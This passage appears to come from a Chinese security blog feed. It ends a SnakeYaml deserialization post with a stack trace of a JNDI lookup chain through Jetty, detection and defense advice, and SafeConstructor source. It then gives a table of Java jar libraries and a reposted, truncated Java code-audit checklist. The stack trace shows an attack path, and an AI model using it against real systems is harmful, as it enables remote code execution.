class="line">getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:319, NamingManager (javax.naming.spi)</span><br><span class="line">lookup:503, NamingContext (org.eclipse.jetty.jndi)</span><br><span class="line">lookup:578, NamingContext (org.eclipse.jetty.jndi)</span><br><span class="line">bind:69, NamingUtil (org.eclipse.jetty.jndi)</span><br><span class="line">save:202, NamingEntry (org.eclipse.jetty.plus.jndi)</span><br><span class="line">&lt;init&gt;:39, Resource (org.eclipse.jetty.plus.jndi)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">construct:548, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructSequenceStep2:376, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructSequence:360, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:499, SafeConstructor$ConstructYamlSeq (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:453, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:10, Test</span><br></pre></td></tr></table></figure><h2 id="0x04-检测与防御"><a href="#0x04-检测与防御" class="headerlink" title="0x04 检测与防御"></a>0x04 检测与防御</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>排查服务端环境是否使用了SnakeYaml，若使用了则全局搜索关键字<code>yaml.load(</code>，若存在该关键字则需要进一步排查参数是否外部可控。</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>禁止Yaml.load()函数参数外部可控；</li><li>若业务确实需要反序列化，则需严格过滤该参数内容，使用SafeConstructor对反序列化的内容进行限制或使用白名单控制反序列化的类的白名单；</li></ul><p>在snakeyaml-1.25-sources.jar!/org/yaml/snakeyaml/constructor/SafeConstructor.java中看到，其构造函数就自定义了反序列化的类的白名单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">SafeConstructor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.NULL, <span class="keyword">new</span> ConstructYamlNull());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.BOOL, <span class="keyword">new</span> ConstructYamlBool());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.INT, <span class="keyword">new</span> ConstructYamlInt());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.FLOAT, <span class="keyword">new</span> ConstructYamlFloat());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.BINARY, <span class="keyword">new</span> ConstructYamlBinary());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.TIMESTAMP, <span class="keyword">new</span> ConstructYamlTimestamp());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.OMAP, <span class="keyword">new</span> ConstructYamlOmap());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.PAIRS, <span class="keyword">new</span> ConstructYamlPairs());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.SET, <span class="keyword">new</span> ConstructYamlSet());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.STR, <span class="keyword">new</span> ConstructYamlStr());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.SEQ, <span class="keyword">new</span> ConstructYamlSeq());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.MAP, <span class="keyword">new</span> ConstructYamlMap());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(<span class="keyword">null</span>, undefinedConstructor);</span><br><span class="line">    <span class="keyword">this</span>.yamlClassConstructors.put(NodeId.scalar, undefinedConstructor);</span><br><span class="line">    <span class="keyword">this</span>.yamlClassConstructors.put(NodeId.sequence, undefinedConstructor);</span><br><span class="line">    <span class="keyword">this</span>.yamlClassConstructors.put(NodeId.mapping, undefinedConstructor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/2042#toc-21" target="_blank" rel="noopener">Java反序列化备忘录</a></p><p><a href="http://vulsee.com/archives/vulsee_2019/1025_9168.html" target="_blank" rel="noopener">yaml.load()反序列化漏洞测试</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>（转）Java项目中常见jar包的说明</title>
    <link href="https://www.mi1k7ea.com/2019/11/25/%EF%BC%88%E8%BD%AC%EF%BC%89Java%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%B8%B8%E8%A7%81jar%E5%8C%85%E7%9A%84%E8%AF%B4%E6%98%8E/"/>
    <id>https://www.mi1k7ea.com/2019/11/25/（转）Java项目中常见jar包的说明/</id>
    <published>2019-11-25T15:33:03.000Z</published>
    <updated>2019-11-27T14:23:29.253Z</updated>
    
    <content type="html"><![CDATA[<p>转自：<a href="https://blog.csdn.net/superdog007/article/details/50697831" target="_blank" rel="noopener">https://blog.csdn.net/superdog007/article/details/50697831</a></p><table><thead><tr><th style="text-align:left">Jar包</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left">axis.jar</td><td style="text-align:left">SOAP引擎包</td></tr><tr><td style="text-align:left">commons-discovery-0.2.jar</td><td style="text-align:left">用来发现、查找和实现可插入式接口，提供一些一般类实例化、单件的生命周期管理的常用方法.</td></tr><tr><td style="text-align:left">jaxrpc.jar</td><td style="text-align:left">Axis运行所需要的组件包</td></tr><tr><td style="text-align:left">saaj.jar</td><td style="text-align:left">创建到端点的点到点连接的方法、创建并处理SOAP消息和附件的方法，以及接收和处理SOAP错误的方法.</td></tr><tr><td style="text-align:left">wsdl4j-1.5.1.jar</td><td style="text-align:left">Axis运行所需要的组件包</td></tr><tr><td style="text-align:left">activation.jar</td><td style="text-align:left">JAF框架的jar包</td></tr><tr><td style="text-align:left">annotations-api.jar</td><td style="text-align:left">使用注解所需jar</td></tr><tr><td style="text-align:left">ant.jar</td><td style="text-align:left">用于自动化调用程序完成项目的编译，打包，测试等</td></tr><tr><td style="text-align:left">aopalliance-1.0.jar</td><td style="text-align:left">支持Spring</td></tr><tr><td style="text-align:left">asm-2.2.3.jar</td><td style="text-align:left">ASM字节码库</td></tr><tr><td style="text-align:left">asm-commons-2.2.3.jar</td><td style="text-align:left">ASM字节码库</td></tr><tr><td style="text-align:left">asm-util-2.2.3.jar</td><td style="text-align:left">Java字节码操纵和分析框架</td></tr><tr><td style="text-align:left">aspectjrt.jar</td><td style="text-align:left">处理事务和AOP所需的包</td></tr><tr><td style="text-align:left">aspectjweaver.jar</td><td style="text-align:left">处理事务和AOP所需的包</td></tr><tr><td style="text-align:left">axiom-api-1.2.7.jar</td><td style="text-align:left">Axis</td></tr><tr><td style="text-align:left">axiom-impl-1.2.7.jar</td><td style="text-align:left">Axis</td></tr><tr><td style="text-align:left">bcprov-jdk15-140.jar</td><td style="text-align:left">基于java1.5</td></tr><tr><td style="text-align:left">bfmclientmodel.jar</td><td style="text-align:left">使用WebSphere所需jar包</td></tr><tr><td style="text-align:left">bpcclientcore.jar</td><td style="text-align:left">使用WebSphere所需jar包</td></tr><tr><td style="text-align:left">bpe137650.jar</td><td style="text-align:left">提供远程访问BPE容器的实现。</td></tr><tr><td style="text-align:left">bsh-2.0b4.jar</td><td style="text-align:left">解决负载逻辑运算</td></tr><tr><td style="text-align:left">c3p0-0.9.0.jar</td><td style="text-align:left">开放源代码的JDBC连接池</td></tr><tr><td style="text-align:left">cglib-nodep-2.1_3.jar</td><td style="text-align:left">Spring中自动代理所需jar包</td></tr><tr><td style="text-align:left">cobertura.jar</td><td style="text-align:left">测量测试覆盖率</td></tr><tr><td style="text-align:left">commons-beanutils-1.7.0.jar</td><td style="text-align:left">动态的获取/设值Java</td></tr><tr><td style="text-align:left">commons-chain-1.1.jar</td><td style="text-align:left">实现责任链设计模式的Java</td></tr><tr><td style="text-align:left">commons-codec-1.3.jar</td><td style="text-align:left">用来处理常用的编码方法的工具类包，例如DES、SHA1、MD5、Base64等等</td></tr><tr><td style="text-align:left">commons-collections-3.1.jar</td><td style="text-align:left">对标准java</td></tr><tr><td style="text-align:left">commons-collections.jar</td><td style="text-align:left">对标准java</td></tr><tr><td style="text-align:left">commons-digester-1.8.jar</td><td style="text-align:left">用于处理struts-config.xml配置文件</td></tr><tr><td style="text-align:left">commons-fileupload-1.1.1.jar</td><td style="text-align:left">struts上传文件</td></tr><tr><td style="text-align:left">commons-httpclient-3.1.jar</td><td style="text-align:left">用来简化HTTP客户端与服务器端进行各种通信编程实现</td></tr><tr><td style="text-align:left">commons-io-1.1.jar</td><td style="text-align:left">针对java.io.InputStream和Reader进行了扩展</td></tr><tr><td style="text-align:left">commons-lang-2.4.jar</td><td style="text-align:left">对java.lang.*的扩展</td></tr><tr><td style="text-align:left">commons-logging-1.1.1.jar</td><td style="text-align:left">日志包</td></tr><tr><td style="text-align:left">commons-pool-1.3.jar</td><td style="text-align:left">实现对象池化框架</td></tr><tr><td style="text-align:left">commons-validator-1.3.1.jar</td><td style="text-align:left">用来把验证规则程序提取出来，以供重复使用</td></tr><tr><td style="text-align:left">db2jcc.jar</td><td style="text-align:left">java连接DB2所需jar</td></tr><tr><td style="text-align:left">db2jcc_license_cu.jar</td><td style="text-align:left">java连接DB2所需jar</td></tr><tr><td style="text-align:left">dom4j-1.6.1.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">ehcache-1.2.4.jar</td><td style="text-align:left">hibernate的二级缓存如果用ehcache的时候需要此jar包</td></tr><tr><td style="text-align:left">emf.jar</td><td style="text-align:left">基于Eclipse的模型框架</td></tr><tr><td style="text-align:left">ezmorph-1.0.6.jar</td><td style="text-align:left">使用JSON所需的jar包</td></tr><tr><td style="text-align:left">FastInfoset-1.2.2.jar</td><td style="text-align:left">使用WebService所需的jar包</td></tr><tr><td style="text-align:left">freemarker-2.3.8.jar</td><td style="text-align:left">Strus2支持的一种表现层框架</td></tr><tr><td style="text-align:left">geronimo-activation_1.1_spec-1.0.2.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-annotation_1.0_spec-1.1.1.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-javamail_1.4_spec-1.3.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-jaxws_2.1_spec-1.0.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-jms_1.1_spec-1.1.1.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-servlet_2.5_spec-1.2.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-stax-api_1.0_spec-1.0.1.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">hibernate3.jar</td><td style="text-align:left">Hibernate3的核心jar包</td></tr><tr><td style="text-align:left">htmclientmodel.jar</td><td style="text-align:left">使用WebSphere所需jar包</td></tr><tr><td style="text-align:left">jakarta-oro.jar</td><td style="text-align:left">一套文本处理工具，提供per15.0兼容的表达式，AWK-like表达式，Glob表达式。</td></tr><tr><td style="text-align:left">javassist.jar</td><td style="text-align:left">Javassist</td></tr><tr><td style="text-align:left">jaxb-api-2.1.jar</td><td style="text-align:left">使用WebService所需的jar包</td></tr><tr><td style="text-align:left">jaxb-impl-2.1.7.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">jaxb-xjc-2.1.7.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">jaxen-1.1.1.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">jcifs-1.2.22.jar</td><td style="text-align:left">实现单点登陆</td></tr><tr><td style="text-align:left">jdom2-1.0.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">jdom-1.0.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">jettison-1.0.1.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">jetty-6.1.9.jar</td><td style="text-align:left">Jetty</td></tr><tr><td style="text-align:left">jetty-util-6.1.9.jar</td><td style="text-align:left">Jetty</td></tr><tr><td style="text-align:left">jra-1.0-alpha-4.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">js-1.6R7.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">json-lib-2.2.3-jdk13.jar</td><td style="text-align:left">使用JSON所需的jar包</td></tr><tr><td style="text-align:left">jsonplugin-0.25.jar</td><td style="text-align:left">strus2的JSON插件</td></tr><tr><td style="text-align:left">jsr311-api-0.8.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">jstl.jar</td><td style="text-align:left">JSTL标签库</td></tr><tr><td style="text-align:left">jta.jar</td><td style="text-align:left">标准的</td></tr><tr><td style="text-align:left">junit.jar</td><td style="text-align:left">用于单元测试</td></tr><tr><td style="text-align:left">jxl.jar</td><td style="text-align:left">通过java操作excel表格的工具类库</td></tr><tr><td style="text-align:left">ldap.jar</td><td style="text-align:left">JNDI目录服务和LDAO服务器所需的jar</td></tr><tr><td style="text-align:left">ldapbp.jar</td><td style="text-align:left">JNDI目录服务和LDAO服务器所需的jar</td></tr><tr><td style="text-align:left">log4j-1.2.15.jar</td><td style="text-align:left">提供日志功能</td></tr><tr><td style="text-align:left">mail.jar</td><td style="text-align:left">java发送邮件jar包</td></tr><tr><td style="text-align:left">neethi-2.0.4.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">odmg-3.0.jar</td><td style="text-align:left">ODMG是一个ORM的规范，Hibernate实现了ODMG规范，这是一个核心的库</td></tr><tr><td style="text-align:left">gnl-2.6.11.jar</td><td style="text-align:left">struts2中OGNL语言</td></tr><tr><td style="text-align:left">ojdbc14.jar</td><td style="text-align:left">Oracle数据库驱动包</td></tr><tr><td style="text-align:left">opensaml-1.1.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">oro-2.0.8.jar</td><td style="text-align:left">Validator框架所需的jar包</td></tr><tr><td style="text-align:left">oscache-2.1.jar</td><td style="text-align:left">Java</td></tr><tr><td style="text-align:left">poi-3.1-FINAL-20080629.jar</td><td style="text-align:left">操作exce所需jar包</td></tr><tr><td style="text-align:left">poi-contrib-3.1-FINAL-20080629.jar</td><td style="text-align:left">操作exce所需jar包</td></tr><tr><td style="text-align:left">poi-ooxml-3.6-20091214.jar</td><td style="text-align:left">提供对office的word、excel、visio及ppt的操作</td></tr><tr><td style="text-align:left">poi-ooxml-schemas-3.6-20091214.jar</td><td style="text-align:left">提供对office的word、excel、visio及ppt的操作</td></tr><tr><td style="text-align:left">poi-scratchpad-3.1-FINAL-20080629.jar</td><td style="text-align:left">提供对office的word、excel、visio及ppt的操作</td></tr><tr><td style="text-align:left">processCommon.jar</td><td style="text-align:left">IBM</td></tr><tr><td style="text-align:left">ProcessCommonLibrary.jar</td><td style="text-align:left">IBM</td></tr><tr><td style="text-align:left">processIdentity.jar</td><td style="text-align:left">IBM</td></tr><tr><td style="text-align:left">ProcessInformation.jar</td><td style="text-align:left">进程监视软件包</td></tr><tr><td style="text-align:left">proxool-0.9.1.jar</td><td style="text-align:left">数据库连接池</td></tr><tr><td style="text-align:left">proxool-cglib.jar</td><td style="text-align:left">数据库连接池</td></tr><tr><td style="text-align:left">quartz-1.6.0.jar</td><td style="text-align:left">开源作业调度框架</td></tr><tr><td style="text-align:left">saaj-api-1.3.jar</td><td style="text-align:left">使用axis所需的jar</td></tr><tr><td style="text-align:left">saaj-impl-1.3.2.jar</td><td style="text-align:left">使用axis所需的jar</td></tr><tr><td style="text-align:left">serializer-2.7.1.jar</td><td style="text-align:left">XML序列化</td></tr><tr><td style="text-align:left">slf4j-jdk14-1.5.6.jar</td><td style="text-align:left">整合各种日志框架的工具</td></tr><tr><td style="text-align:left">spring208.jar</td><td style="text-align:left">spring核心框架</td></tr><tr><td style="text-align:left">spring-ldap-1.2-RC1.jar</td><td style="text-align:left">spring下LDAP</td></tr><tr><td style="text-align:left">spring-mock.jar</td><td style="text-align:left">spring的测试框架</td></tr><tr><td style="text-align:left">standard.jar</td><td style="text-align:left">使用JSTL标签库所需的jar</td></tr><tr><td style="text-align:left">stax-api-1.0.1.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">struts2-core-2.0.14.jar</td><td style="text-align:left">struts2核心jar</td></tr><tr><td style="text-align:left">struts2-spring-plugin-2.0.6.jar</td><td style="text-align:left">struts2整合Spring所需jar</td></tr><tr><td style="text-align:left">taglibs-datetime.jar</td><td style="text-align:left">Apache开源组织提供标签库，用于格式化日期。</td></tr><tr><td style="text-align:left">taglibs-mailer.jar</td><td style="text-align:left">用于发送邮件</td></tr><tr><td style="text-align:left">taglibs-string.jar</td><td style="text-align:left">Apache开源组织提供标签库，用于对String的操作。</td></tr><tr><td style="text-align:left">task137650.jar</td><td style="text-align:left">Portal技术在SOA系统集成应用中实现所需的jar</td></tr><tr><td style="text-align:left">utility.jar</td><td style="text-align:left">Apache开源组织提供标签库</td></tr><tr><td style="text-align:left">velocity-1.5.jar</td><td style="text-align:left">一个免费的开源模板框架</td></tr><tr><td style="text-align:left">wsdl4j-1.6.2.jar</td><td style="text-align:left">用来解析服务的WSDl文件</td></tr><tr><td style="text-align:left">wss4j-1.5.4.jar</td><td style="text-align:left">创建CXF所需jar</td></tr><tr><td style="text-align:left">wss4j-1.5.4.jar</td><td style="text-align:left">创建CXF所需jar</td></tr><tr><td style="text-align:left">wstx-asl-3.2.6.jar</td><td style="text-align:left">创建CXF所需jar</td></tr><tr><td style="text-align:left">xbean-spring-2.8.jar</td><td style="text-align:left">使用xfire所需jar</td></tr><tr><td style="text-align:left">xerces-2.6.2.jar</td><td style="text-align:left">XML解析器</td></tr><tr><td style="text-align:left">xfire-all-1.2.6.jar</td><td style="text-align:left">用于实现WebService</td></tr><tr><td style="text-align:left">XmlSchema-1.1.jar</td><td style="text-align:left">使用xfire所需jar</td></tr><tr><td style="text-align:left">xwork-2.0.7.jar</td><td style="text-align:left">WebWork核心jar</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>（转）Java代码审计指南</title>
    <link href="https://www.mi1k7ea.com/2019/11/25/%EF%BC%88%E8%BD%AC%EF%BC%89Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%8C%87%E5%8D%97/"/>
    <id>https://www.mi1k7ea.com/2019/11/25/（转）Java代码审计指南/</id>
    <published>2019-11-25T14:20:15.000Z</published>
    <updated>2019-11-27T14:23:36.460Z</updated>
    
    <content type="html"><![CDATA[<p>转自：<a href="http://blog.nsfocus.net/code-audit-instruction/" target="_blank" rel="noopener">http://blog.nsfocus.net/code-audit-instruction/</a></p><h2 id="一、测试工具"><a href="#一、测试工具" class="headerlink" title="一、测试工具"></a>一、测试工具</h2><h3 id="1-1-反编译java类"><a href="#1-1-反编译java类" class="headerlink" title="1.1 反编译java类"></a>1.1 反编译java类</h3><p>如果项目中未提供所有java源代码，只提供编译后的class文件，可以运行jd-gui，选择菜单File—Open File，对class文件进行反编译</p><p><img src="/2019/11/25/（转）Java代码审计指南/1.png" alt=""></p><p><img src="/2019/11/25/（转）Java代码审计指南/2.png" alt=""></p><p>选择class文件或者jar包，点击打开按钮，即可查看反汇编后的java源代码</p><p><img src="/2019/11/25/（转）Java代码审计指南/3.png" alt=""></p><h3 id="1-2-Eclipse环境审计"><a href="#1-2-Eclipse环境审计" class="headerlink" title="1.2 Eclipse环境审计"></a>1.2 Eclipse环境审计</h3><p>使用Eclipse的Import功能将程序代码导入workspace，打开任一java源文件，选择Source Analyse菜单下的条目进行关键方法搜索，搜索结果在窗口下面显示，然后进行人工分析。</p><p><img src="/2019/11/25/（转）Java代码审计指南/4.png" alt=""></p><h2 id="二、认证管理"><a href="#二、认证管理" class="headerlink" title="二、认证管理"></a>二、认证管理</h2><h3 id="2-1-图形验证码"><a href="#2-1-图形验证码" class="headerlink" title="2.1 图形验证码"></a>2.1 图形验证码</h3><ul><li>用户登录过程是否有图形验证码保护，防止自动化程序猜测密码</li><li>验证码复杂度是否符合要求（干扰、变形）</li><li>验证码在使用过一次后是否会自动刷新</li><li>验证码明文是否会被传送给客户端（页面或Cookie）</li><li>验证码是否在被保护的操作进行前来验证（无验证或无效验证）</li></ul><h3 id="2-2-认证实现"><a href="#2-2-认证实现" class="headerlink" title="2.2 认证实现"></a>2.2 认证实现</h3><ul><li>用户认证过程中，用户名和密码合法性的检查方式是否符合要求</li></ul><p>较安全的做法为先校验验证码，再检查用户名，最后比对密码的密文</p><ul><li>是否具备用户注销功能</li></ul><p>用户注销时是否清理了当前用户会话</p><ul><li>是否会将密码作为重定向的一部分进行传送</li></ul><p>在统一认证SSO模式下，有的实现并非使用Token来交换认证信息，而是通过客户端直接传递账号、密码，这种情形下有可能在URL中直接传递明文密码。</p><ul><li>认证过程中对于用户名错误和密码错误提示是否相同</li></ul><p>统一用户名和密码错误提示，可以降低账号、密码被猜解的风险</p><ul><li>检查用户认证页面是否对认证失败的次数进行了限制</li></ul><h2 id="三、授权管理"><a href="#三、授权管理" class="headerlink" title="三、授权管理"></a>三、授权管理</h2><h3 id="3-1-授权实现"><a href="#3-1-授权实现" class="headerlink" title="3.1 授权实现"></a>3.1 授权实现</h3><ul><li>应用的用户是否具有角色的区分</li></ul><p>明确用户的角色定义、授权访问的范围，分析哪种情况下可能会导致越权</p><ul><li>应用是否具备统一的（或独立）的权限控制模块</li></ul><p>大部分的大型应用都会采用统一的权限控制模块</p><ul><li>应用的权限控制模块是否存在漏洞</li><li>页面/功能是否使用了权限控制（模块）</li></ul><p>识别出需要和无需权限控制的页面/功能，逐一进行验证。验证过程中需要考虑到用户的角色划分。</p><ul><li>页面的权限控制是否正确</li></ul><p>部分应用的权限控制（模块）的使用上存在缺陷，攻击者可能通过一些隐蔽的途径绕过鉴权，访问非授权资源</p><h3 id="3-2-授权管理"><a href="#3-2-授权管理" class="headerlink" title="3.2 授权管理"></a>3.2 授权管理</h3><ul><li>高权限用户分析</li></ul><p>分析系统高权限用户（例如：管理员用户）的分配情况及密码复杂度等</p><ul><li>默认用户分析</li></ul><p>分析系统是否存在默认用户、密码，密码复杂度等。</p><h2 id="四、输入-输出验证"><a href="#四、输入-输出验证" class="headerlink" title="四、输入/输出验证"></a>四、输入/输出验证</h2><h3 id="4-1-SQL注入防护"><a href="#4-1-SQL注入防护" class="headerlink" title="4.1 SQL注入防护"></a>4.1 SQL注入防护</h3><ul><li>是否存在全局过滤器</li></ul><p>过滤器配置、过滤函数等</p><ul><li>过滤器是否可以过滤所有查询请求</li></ul><p>请求是否都按要求经过过滤器处理</p><ul><li>过滤器的过滤是否符合要求</li></ul><p>初期检查可以依据PHPIDS的规则库，后期根据收集的情况予以补充</p><ul><li>是否使用了预查询机制</li></ul><p>预查询是指在将数据传入SQL语句前明确指定传输数据的类型，以执行必要的转换。在Java中预查询的调用方式为prepareStatement。</p><ul><li>是否存在SQL语句拼接</li></ul><p>某些特殊的查询（特别复杂的组合查询）难免用到SQL语句拼接，遇到这种情况，就需要检查拼接是否有可能导致注入。</p><h3 id="4-2-跨站攻击防护"><a href="#4-2-跨站攻击防护" class="headerlink" title="4.2 跨站攻击防护"></a>4.2 跨站攻击防护</h3><ul><li>是否存在全局XSS过滤器(论坛的过滤库)</li><li>过滤器的过滤是否符合要求</li><li>是否存在需过滤和不需过滤两种输出，页面是否控制恰当（*）</li></ul><p>某些情况下可能存在两种输出，文本输出和富文本（HTML）输出，要强制文本输出，只需要调用HTMLEncode()对内容进行编码后输出即可；但是富文本本身就需要使用html来进行格式的控制，简单的编码就无法使用，这时需要在此类内容从客户端输入（用户提交）或输出给客户端（显示）时进行危险代码过滤。</p><ul><li>输出的时候是否进行编码（HTML、JS）</li></ul><h3 id="4-3-CSRF攻击防护"><a href="#4-3-CSRF攻击防护" class="headerlink" title="4.3 CSRF攻击防护"></a>4.3 CSRF攻击防护</h3><ul><li>Web表单是否使用了Token（或验证码）</li><li>Web表单提交（成功或不成功）后token（或验证码）是否重置</li><li>检查Token的生成算法是否安全</li></ul><p>可以从测试环境来检查生成的验证码是否符合复杂性要求，如是否有干扰线/点、字符变形等。</p><ul><li>检查服务器获取Web表单参数值的方式</li></ul><p>如果在操作时不严格区分GET和POST，在没有Token（或验证码）的辅助下很容易导致CSRF的发生。</p><h3 id="4-4-文件上传防护"><a href="#4-4-文件上传防护" class="headerlink" title="4.4 文件上传防护"></a>4.4 文件上传防护</h3><ul><li>是否限制了上传文件的扩展名</li></ul><p>以白名单形式指定允许上传的扩展名；以黑名单形式指定禁止上传的文件名</p><ul><li>是否对上传文件进行了重命名操作</li></ul><p>重命名操作是否安全，防止重命名过程中产生二次风险</p><ul><li>是否对上传文件的存放位置禁止了脚本执行</li></ul><h3 id="4-5-文件下载防护"><a href="#4-5-文件下载防护" class="headerlink" title="4.5 文件下载防护"></a>4.5 文件下载防护</h3><ul><li>是否存在客户端指定文件名的下载功能</li><li>直接指定文件名的下载是否允许客户端指定路径</li><li>对于不同用户的文件在下载时是否进行了权限控制</li></ul><p>文件下载功能中是否对用户的权限进行了检查。</p><h3 id="4-6-重定向与转发保护"><a href="#4-6-重定向与转发保护" class="headerlink" title="4.6 重定向与转发保护"></a>4.6 重定向与转发保护</h3><ul><li>是否具有客户端控制的重定向或转发</li><li>是否定义了重定向的信任域名或主机列表</li><li>是否对客户端的重定向或转发请求进行检查</li></ul><h2 id="五、会话管理"><a href="#五、会话管理" class="headerlink" title="五、会话管理"></a>五、会话管理</h2><h3 id="5-1-Session管理"><a href="#5-1-Session管理" class="headerlink" title="5.1 Session管理"></a>5.1 Session管理</h3><ul><li>session信息是否放在url里面</li></ul><p>通过应用服务器的配置检查</p><ul><li>执行业务功能时，是否检查了当前用户session身份</li></ul><p>从代码部分、从配置部分检查，需要根据应用实际使用的验证方式</p><ul><li>成功登陆之后是否会更新SessionID</li></ul><p>认证成功后是否强制刷新用户使用的SessionID</p><ul><li>session是否有超时注销功能</li></ul><p>检查Session的超时时间设置是否符合要求，默认是20~30分钟</p><h3 id="5-2-Cookie管理"><a href="#5-2-Cookie管理" class="headerlink" title="5.2 Cookie管理"></a>5.2 Cookie管理</h3><ul><li>是否会在Cookie中存储明文或简单编码/加密过的密码</li><li>是否会在Cookie中存储应用的特权标识</li><li>是否设置了Cookie的有效域和有效路径</li><li>是否设置了合适的Cookie有效时间</li></ul><p>如果生存时间在20~30分钟左右，使用Session方式会更加安全</p><h2 id="六、密码管理"><a href="#六、密码管理" class="headerlink" title="六、密码管理"></a>六、密码管理</h2><h3 id="6-1-加密安全"><a href="#6-1-加密安全" class="headerlink" title="6.1 加密安全"></a>6.1 加密安全</h3><ul><li>密码是否以不可逆的哈希形态存储</li><li>是否使用不带salt的哈希算法来加密密码</li><li>加密哈希算法中的salt是否硬编码在代码中</li></ul><h3 id="6-2-密码安全"><a href="#6-2-密码安全" class="headerlink" title="6.2 密码安全"></a>6.2 